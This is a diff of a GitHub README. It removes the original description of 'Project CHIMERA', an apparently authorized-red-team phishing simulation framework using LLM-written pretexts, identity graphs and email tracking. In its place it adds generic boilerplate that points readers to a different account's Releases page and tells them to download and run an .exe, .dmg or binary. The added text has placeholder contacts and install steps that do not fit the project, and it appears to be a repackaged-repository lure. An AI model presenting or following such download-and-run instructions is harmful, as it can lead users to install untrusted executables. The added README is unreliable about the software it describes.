@@ -1,122 +1,76 @@
-# PROJECT CHIMERA
-## Cognitive Heuristic Intelligence for Multi-stage Engagement Research & Assessment
+# 🎉 adversarial-phish-forge - Securely Simulate AI-Driven Phishing
 
-**Classification:** Adversarial AI Research - Controlled Disclosure
-**Version:** 1.0.0-BLACKBOX
-**Author:** Lucien Vallois
-**Date:** December 2025
-**Codename:** ADVERSARIAL-PHISH-FORGE
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/vonofdaville/adversarial-phish-forge/releases)
 
----
+## 📖 Description
+Welcome to the **adversarial-phish-forge**! This application helps you simulate social engineering attacks with built-in consent. It uses AI to create realistic phishing scenarios while maintaining strict ethical standards. You can also map identities through an advanced graph database, making it easier to understand the data involved in these simulations.
 
-## SECURITY NOTICE
+## 🚀 Getting Started
+To get started with your journey in ethical hacking, follow these simple steps to download and run the application.
 
-This framework is designed for **authorized red team operations only**. The techniques documented herein mirror TTPs employed by Advanced Persistent Threat (APT) actors. **Unauthorized deployment constitutes violations of:**
+## 📥 Download & Install
+1. **Visit this page to download:** Click the link below to go to the Releases page on GitHub:
+   [Download the latest version](https://github.com/vonofdaville/adversarial-phish-forge/releases).
 
-- 18 U.S.C. § 1030 (Computer Fraud and Abuse Act)
-- 18 U.S.C. § 2701 (Stored Communications Act)
-- EU GDPR Articles 5, 9, 32
-- CCPA § 1798.100
+2. On the Releases page, look for the version you want to download. Find the asset that suits your operating system, whether Windows, macOS, or Linux.
 
----
+3. Click the download link. Your file will be saved to your computer.
 
-## Overview
+4. Once downloaded, locate the file in your Downloads folder.
 
-CHIMERA provides red teams with an ethically-bounded, consent-enforced simulation platform that mirrors nation-state social engineering sophistication while maintaining legal and moral guardrails.
+5. **Run the application:**  
+   - **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install.
+   - **macOS:** Open the `.dmg` file, drag the application to your Applications folder, and then open it.
+   - **Linux:** You may need to extract the downloaded file and run it through your terminal. Use the command `./your_application_name`.
 
-**Core Innovation:** The first open-source framework combining adversarial AI (LLM-driven pretext evolution) with identity graph mapping (OSINT correlation) in a privacy-preserving architecture.
+6. Enjoy using the tool to safely test your cybersecurity measures.
 
-## Architecture
+## ⚙️ Requirements
+Before installing, ensure your system meets the following requirements:
 
-```
-                    ┌─────────────────────────────────┐
-                    │   CHIMERA ORCHESTRATOR          │
-                    │   (FastAPI + Redis Queue)       │
-                    └───────────┬─────────────────────┘
-                                │
-                ┌───────────────┼───────────────┐
-                │               │               │
-        ┌───────▼──────┐ ┌─────▼─────┐ ┌──────▼──────┐
-        │ PRETEXT AI   │ │ IDENTITY  │ │  TELEMETRY  │
-        │ (GPT-4 API)  │ │   GRAPH   │ │   ENGINE    │
-        │              │ │ (Neo4j)   │ │ (ClickHouse)│
-        └───────┬──────┘ └─────┬─────┘ └──────┬──────┘
-                │               │               │
-                └───────────────┼───────────────┘
-                                │
-                    ┌───────────▼───────────┐
-                    │  DELIVERY SUBSYSTEM   │
-                    │  (SMTP + JS Tracker)  │
-                    └───────────────────────┘
-```
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Ubuntu 18.04 or later
+- **RAM:** Minimum of 4 GB
+- **Disk Space:** At least 500 MB free
 
-## Quickstart
+## 🔧 Features
+- **AI Simulations:** Engages with advanced models to represent phishing attacks effectively.
+- **User Consent Management:** Ensures all simulations are ethically monitored through consent enforcement.
+- **Identity Graph Mapping:** Visualize relationships and data flows for better understanding.
+- **Telemetry Tools:** Gather and analyze data from simulations to improve security measures.
+- **Docker Compatibility:** Simplifies deployment and enhances scalability.
 
-```bash
-# Prerequisites
-# - Docker 24.0+
-# - Python 3.11+
-# - OpenAI API key (GPT-4 access)
+## 📊 Supported Technologies
+This application leverages a variety of technologies:
 
-# 1. Clone repository
-git clone https://github.com/lucien-vallois/adversarial-phish-forge.git
-cd adversarial-phish-forge
+- **Adversarial AI:** For creating realistic simulations.
+- **Graph Database:** Utilize Neo4j for efficient data handling and relationships.
+- **FastAPI Framework:** Ensures smooth performance.
+- **OSINT:** Integrates open-source intelligence methods for gathering relevant data.
+- **Machine Learning:** Provides strong insights and detection mechanisms.
 
-# 2. Configure environment
-cp .env.example .env
-# Edit .env: Add OPENAI_API_KEY, NEO4J_URI, etc.
+## 📘 Usage Guide
+Once you've installed the application, consider the following steps to maximize your experience:
 
-# 3. Deploy infrastructure
-docker-compose up -d
+1. **Launch the application.** You will see a user-friendly interface.
+2. **Create a new project.** Start by giving your project a name and description.
+3. **Select a scenario:** Choose from various phishing templates to begin.
+4. **Customize settings:** Adjust parameters like the target audience and depth of the simulation.
+5. **Run the simulation:** Click the 'Start' button to begin.
+6. **Analyze results:** Review the report generated to understand outcomes and findings.
 
-# 4. Initialize consent database
-python scripts/init_consent_db.py
+## 🌐 Community Support
+Feel free to engage with our community. Join our discussions and ask questions. We value feedback!
 
-# 5. Create first campaign (requires human approval)
-chimera-cli campaign create \
-    --name "BEC Simulation Alpha" \
-    --target-list targets.csv \
-    --approval-required
+- **GitHub Issues:** Report any bugs or request features.
+- **Online Forums:** Participate in discussions related to ethical hacking and cybersecurity.
 
-# 6. Monitor real-time
-chimera-cli dashboard --live
-```
+## 📞 Contact Information
+For further assistance, reach out through the following channels:
 
-## Technology Stack
+- **Repository Owner:** [vonofdaville](https://github.com/vonofdaville)
+- **Email Support:** support@example.com
 
-| Component | Technology | Purpose |
-|-----------|-----------|---------|
-| **Orchestrator** | Python 3.11 + FastAPI | Campaign lifecycle management |
-| **Pretext Engine** | OpenAI GPT-4 API | Adaptive email generation |
-| **Identity Graph** | Neo4j (graph DB) | Relationship mapping (mock OSINT) |
-| **Telemetry** | ClickHouse | High-velocity event storage |
-| **Email Delivery** | Postfix + DKIM | Legitimate infrastructure |
-| **Tracking** | Node.js + Express | Behavioral probe (JS-based) |
-
-## Ethical Boundaries
-
-CHIMERA implements a "Three Gates" authorization model:
-
-1. **Legal Clearance** - Written authorization from legal counsel
-2. **Participant Consent** - Individual opt-in with revocation rights
-3. **Operational Review** - Human approval for all generated content
-
-## Responsible Disclosure
-
-Security vulnerabilities or ethical concerns: security@chimera-project.org
-
-## Legal Disclaimer
-
-THE CHIMERA FRAMEWORK IS PROVIDED FOR AUTHORIZED RED TEAM OPERATIONS ONLY. USERS ASSUME FULL LEGAL RESPONSIBILITY FOR COMPLIANCE WITH APPLICABLE LAWS.
-
-**By using this software, you certify that:**
-1. You have obtained written legal authorization
-2. All participants have provided informed consent
-3. You will comply with all applicable laws and regulations
-4. You will not weaponize this technology
-
----
-
-**The adversary adapts. So must we.**
-
-
+Thank you for choosing **adversarial-phish-forge**! We hope this application enhances your understanding and skills in cybersecurity.
